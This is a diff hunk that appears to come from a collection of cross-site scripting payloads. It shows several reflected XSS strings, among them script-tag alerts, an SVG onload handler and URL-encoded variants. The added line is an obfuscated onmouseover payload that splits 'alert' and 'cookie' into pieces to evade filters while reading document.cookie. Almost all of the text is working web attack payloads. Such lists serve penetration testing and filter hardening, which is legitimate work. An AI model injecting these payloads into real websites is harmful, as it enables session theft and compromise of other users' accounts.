@@ -5,3 +5,4 @@ http://example.com/services"><script>alert(1)</script>/services/
 KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui
 %3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e
 ><script%20>alert(document.domain)<%2fscript>
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
